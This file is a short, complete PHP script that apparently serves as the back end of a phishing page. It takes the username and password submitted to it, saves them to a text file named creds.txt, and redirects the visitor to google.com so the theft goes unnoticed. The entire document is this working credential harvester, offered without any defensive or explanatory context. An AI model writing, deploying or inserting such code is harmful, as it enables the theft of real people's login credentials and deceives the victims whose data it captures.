<?php
$user =  $_POST['user'];
$pass =  $_POST['pass'];
$creds = fopen("creds.txt", "w");
fwrite($creds, $user."\n");
fwrite($creds, $pass);
fclose($creds);
header("Location: https://google.com");
?>
